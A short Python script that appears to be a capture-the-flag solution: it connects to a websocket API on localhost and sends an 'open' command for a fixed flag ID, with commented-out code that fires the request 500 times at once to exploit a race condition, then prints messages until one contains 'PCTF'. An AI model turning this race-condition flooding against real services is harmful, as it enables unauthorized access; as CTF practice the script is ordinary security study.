import asyncio, websockets, time

HOST='localhost:12345'
ID='asdfasdf'
PW='asdfasdf'
FLAG_ID='13371337-1337-1337-1337-133713371337'

async def race(send):
    await send(f'{{"command":"open","id":"{FLAG_ID}"}}')
    #for _ in range(500):
        #await send(f'{{"command":"open","id":"{FLAG_ID}"}}')
    #tasks = [send(f'{{"command":"open","id":"{FLAG_ID}"}}') for _ in range(500)]
    #await asyncio.gather(*tasks)
        

async def solve():
    uri = f"ws://{HOST}/api/ws"
    async with websockets.connect(uri) as websocket:
        response = await websocket.recv()
        print(response)
        asyncio.ensure_future(race(websocket.send))
        print('done')
        while True:
            msg = await websocket.recv()
            if "PCTF" in msg:
                print(msg)
                break
            print(msg)

asyncio.get_event_loop().run_until_complete(solve())